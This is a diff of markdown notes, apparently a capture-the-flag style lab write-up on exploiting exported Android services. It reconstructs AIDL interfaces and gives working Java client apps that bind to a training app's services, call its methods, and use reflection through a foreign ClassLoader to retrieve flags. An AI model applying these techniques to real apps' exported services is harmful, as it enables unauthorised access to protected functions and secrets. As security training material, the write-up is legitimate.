@@ -120,7 +120,7 @@ There are two kinds of services:
     * Communication: The client interacts with the service through an `IBinder` interface, which defines the programming interface that the client can use to communicate with the service.
     * Lifecycle: Multiple clients can bind to the service simultaneously; however, the service is destroyed once all clients unbind from it.
 
-### Identify non-bindable services
+**Identify non-bindable services**
 
 After identifying an exposed service (e.g., `android:exported="true"`) in the `AndroidManifest.xml`, the next logical step is to examine the `onBind()` implementation. This determines if the service supports client-server interaction.
 
@@ -137,7 +137,10 @@ This approach is used when an app implements its own Binder class, allowing clie
 
 For our purposes, the main goal is simply to recognize this pattern so we can avoid spending time analyzing this type of service. In practice, this implementation can be identified when the `onBind()` method returns an instance of `Binder`, often following a common naming convention such as `LocalBinder`.
 
-Here's an example of the implementation:
+<details>
+<summary>
+An example of the implementation
+</summary>
 
 ```java
 public class LocalService extends Service {
@@ -168,6 +171,8 @@ public class LocalService extends Service {
     }
 }
 ```
+
+</details>
 
 ### Services with Messenger
 
@@ -465,3 +470,379 @@ public class MainActivity extends AppCompatActivity {
 ```
 
 </details>
+
+### Android Interface Definition Language (AIDL)
+
+[Services that use AIDL (Android Interface Definition Language)](https://developer.android.com/develop/background-work/services/aidl) can usually be identified by inspecting their `onBind()` method. If `onBind()` returns a `.Stub` binder, the service is almost certainly AIDL-based.
+
+AIDL services rely on `.aidl` files, which resemble Java syntax but are written in a dedicated language designed for defining Binder interfaces.
+
+Example AIDL file:
+
+```java
+// IFlag28Interface.aidl
+package io.hextree.attacksurface.services;
+
+interface IFlag28Interface {
+    boolean openFlag();
+}
+```
+
+During compilation, this `.aidl` file is translated into a corresponding `.java` class. That generated class contains the low-level Binder plumbing required to communicate with the service.
+
+To reverse engineer the original `.aidl` file, examine the generated interface code and focus on the following elements:
+
+1. `DESCRIPTOR`: contains the original package name and AIDL interface name
+2. **Interface methods**: methods that declare `throws RemoteException` correspond to AIDL methods
+3. `TRANSACTION_` constants that indicate the original method order in the AIDL file
+
+#### Understanding AIDL
+
+Let's take a look at this code:
+
+```java
+public class Flag29Service extends Service {
+    public static String secret = UUID.randomUUID().toString();
+    private final IFlag29Interface.Stub binder = new IFlag29Interface.Stub() {...}
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return this.binder;
+    }
+}
+```
+
+**Step 1.** The first thing to inspect is the `onBind()` method. It returns `this.binder`, which is an instance of `IFlag29Interface.Stub`. This strongly indicates that the service is backed by an AIDL interface.
+
+**Step 2.** The next step is to examine the generated interface code:
+
+```java
+public interface IFlag29Interface extends IInterface {
+    public static final String DESCRIPTOR = "io.hextree.attacksurface.services.IFlag29Interface";
+
+    public static class Default implements IFlag29Interface {...}
+
+    void authenticate(String str) throws RemoteException;
+
+    String init() throws RemoteException;
+
+    void success() throws RemoteException;
+
+    public static abstract class Stub extends Binder implements IFlag29Interface {
+        static final int TRANSACTION_authenticate = 2;
+        static final int TRANSACTION_init = 1;
+        static final int TRANSACTION_success = 3;
+        ...
+    }
+}
+```
+
+From here we can notice:
+
+1. the `DESCRIPTOR` variable reveals the original AIDL fully qualified name: `io.hextree.attacksurface.services.IFlag29Interface`
+2. The AIDL methods are the interface methods that declare `throws RemoteException`: `authenticate()`, `init()`, `success()`. **So the server exposes these three methods that can be called by other apps.**
+3. The method order in the original `.aidl` file can be reconstructed from the `TRANSACTION_` constants: 
+    1. `init()`, 
+    2. `authenticate()`,
+    3. `success()`. 
+
+**Step 3.** To identify the source code of these methods, we have to return to the service implementation to find the actual method logic. The implementations are defined inside the anonymous `Stub` class:
+
+```java
+public class Flag29Service extends Service {
+    private final IFlag29Interface.Stub binder = new IFlag29Interface.Stub() {
+        ...
+
+        @Override
+        public String init() throws RemoteException {...}
+
+        @Override
+        public void authenticate(String str) throws RemoteException {...}
+
+        @Override
+        public void success() throws RemoteException {...}
+    };
+
+    @Override
+    public IBinder onBind(Intent intent) {...}
+}
+```
+
+**Step 4**. Now we can recreate the original `.aidl` file.
+
+```java
+// IFlag29Interface.aidl
+package io.hextree.attacksurface.services;
+
+interface IFlag29Interface {
+    String init();
+    void authenticate(String str);
+    void success();
+}
+```
+
+#### Interact with an AIDL service
+
+Let's say that the app `io.hextree.attacksurface` has the following `Service`:
+
+```xml
+<service
+    android:name="io.hextree.attacksurface.services.Flag28Service"
+    android:enabled="true"
+    android:exported="true"/>
+```
+
+```java
+public class Flag28Service extends Service {
+    public static String secret = UUID.randomUUID().toString();
+    private final IFlag28Interface.Stub binder = new IFlag28Interface.Stub() {
+        @Override
+        public boolean openFlag() throws RemoteException {
+            return success();
+        }
+
+        public boolean success() {...}
+    };
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        Log.i("Flag28Service", Utils.dumpIntent(this, intent));
+        return this.binder;
+    }
+}
+```
+
+```java
+public interface IFlag28Interface extends IInterface {
+    public static final String DESCRIPTOR = "io.hextree.attacksurface.services.IFlag28Interface";
+
+    public static class Default implements IFlag28Interface {...}
+
+    boolean openFlag() throws RemoteException;
+
+    public static abstract class Stub extends Binder implements IFlag28Interface {...}
+}
+```
+
+**Step 1.** It's a AIDL service because `onBind()` returns `this.binder`, which is an instance of `IFlag28Interface.Stub`.
+
+**Step 2.**
+
+1. `DESCRIPTOR`: `io.hextree.attacksurface.services.IFlag28Interface`
+2. There's just one method called `openFlag()`
+3. The method order doesn't matter because we have just one method
+
+**Step 3.** We have just to call this `openFlag()` method to get the flag.
+
+**Step 4.** The original `.aidl` file is the follow:
+
+```java
+// IFlag28Interface.aidl
+package io.hextree.attacksurface.services;
+
+interface IFlag28Interface {
+    boolean openFlag();
+}
+```
+
+To call `openFlag()` method we must have access to the interface class, so we need a copy of the `.aidl` file. Here's a video that shows how to do it:
+
+<img src="/static/create aidl.gif">
+
+Finally, to get the flag we create a new app as follows:
+
+```java
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        ...
+        Intent intent = new Intent();
+        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");
+        bindService(intent, mConnection, Context.BIND_AUTO_CREATE);
+    }
+
+    private IFlag28Interface flag28Interface;
+
+    private ServiceConnection mConnection = new ServiceConnection() {
+        public void onServiceConnected(ComponentName className, IBinder service) {
+            flag28Interface = IFlag28Interface.Stub.asInterface(service);
+            try {
+                flag28Interface.openFlag();
+            } catch (RemoteException e) {
+                throw new RuntimeException(e);
+            }
+        }
+
+        public void onServiceDisconnected(ComponentName className) {
+            flag28Interface = null;
+        }
+    };
+}
+```
+
+</details>
+
+<details>
+<summary>
+Another example of a multi-method interface
+</summary>
+
+Let's say that the app `io.hextree.attacksurface` has the following `Service`:
+
+```xml
+<service
+    android:name="io.hextree.attacksurface.services.Flag29Service"
+    android:enabled="true"
+    android:exported="true"/>
+```
+
+```java
+public class Flag29Service extends Service {
+    public static String secret = UUID.randomUUID().toString();
+    private final IFlag29Interface.Stub binder = new IFlag29Interface.Stub() {
+        final String pw = UUID.randomUUID().toString();
+        Intent intent = new Intent();
+
+        @Override
+        public String init() throws RemoteException {
+            Log.i("Flag29", "service.init()");
+            return this.pw;
+        }
+
+        @Override
+        public void authenticate(String str) throws RemoteException {
+            Log.i("Flag29", "service.authenticate(" + str + ")");
+            if (str.equals(this.pw)) {
+                this.intent.putExtra("authenticated", true);
+            } else {
+                this.intent.removeExtra("authenticated");
+            }
+        }
+
+        @Override
+        public void success() throws RemoteException {
+            Log.i("Flag29", "service.success()");
+            this.intent.setClass(Flag29Service.this, Flag29Activity.class);
+            if (this.intent.getBooleanExtra("authenticated", false)) {
+                this.intent.putExtra("secret", Flag29Service.secret);
+                this.intent.addFlags(268435456);
+                this.intent.putExtra("hideIntent", true);
+                Flag29Service.this.startActivity(this.intent);
+            }
+        }
+    };
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        Log.i("Flag29Service", Utils.dumpIntent(this, intent));
+        return this.binder;
+    }
+}
+```
+
+```java
+package io.hextree.attacksurface.services;
+
+import android.os.Binder;
+import android.os.IBinder;
+import android.os.IInterface;
+import android.os.Parcel;
+import android.os.RemoteException;
+
+public interface IFlag29Interface extends IInterface {
+    public static final String DESCRIPTOR = "io.hextree.attacksurface.services.IFlag29Interface";
+
+    public static class Default implements IFlag29Interface {...}
+
+    void authenticate(String str) throws RemoteException;
+
+    String init() throws RemoteException;
+
+    void success() throws RemoteException;
+
+    public static abstract class Stub extends Binder implements IFlag29Interface {...}
+}
+```
+
+To get the flag we create a new app as follows:
+
+```java
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        ...
+        Intent intent = new Intent();
+        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service");
+        bindService(intent, mConnection, Context.BIND_AUTO_CREATE);
+    }
+
+    private IFlag29Interface flag29Interface;
+
+    private ServiceConnection mConnection = new ServiceConnection() {
+        public void onServiceConnected(ComponentName className, IBinder service) {
+            flag29Interface = IFlag29Interface.Stub.asInterface(service);
+            try {
+                String pw = flag29Interface.init();
+                flag29Interface.authenticate(pw);
+                flag29Interface.success();
+            } catch (RemoteException e) {
+                throw new RuntimeException(e);
+            }
+        }
+
+        public void onServiceDisconnected(ComponentName className) {
+            flag29Interface = null;
+        }
+    };
+}
+```
+
+```java
+// IFlag29Interface.aidl
+package io.hextree.attacksurface.services;
+
+interface IFlag29Interface {
+    String init();
+    void authenticate(String str);
+    void success();
+}
+```
+
+</details>
+
+#### Bind to AIDL service with ClassLoader
+
+Adding an `.aidl` file to the project can be tedious. An alternative approach that may seem more complex at first is actually much more convenient. By loading the class directly from the target app, we can invoke only the functions we need, without worrying about method order or package names.
+
+The following code snippet demonstrates how to dynamically load the `IFlag28Interface` class from the `io.hextree.attacksurface` app and invoke its `openFlag()` method via the service.
+
+```java
+ServiceConnection mConnection = new ServiceConnection() {
+    @Override
+    public void onServiceConnected(ComponentName name, IBinder service) {
+        // Load the class dynamically
+        ClassLoader classLoader = getForeignClassLoader(Flag28Activity.this, "io.hextree.attacksurface");
+        Class<?> iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");
+
+        Class<?> stubClass = null;
+        for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()) {
+            if (innerClass.getSimpleName().equals("Stub")) {
+                stubClass = innerClass;
+                break;
+            }
+        }
+
+        // Get the asInterface method
+        Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);
+
+        // Invoke the asInterface method to get the instance of IRemoteService
+        Object iRemoteService = asInterfaceMethod.invoke(null, service);
+
+        // Call the init method and get the returned string
+        Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod("openFlag");
+        boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService);
+    }
+}
+```
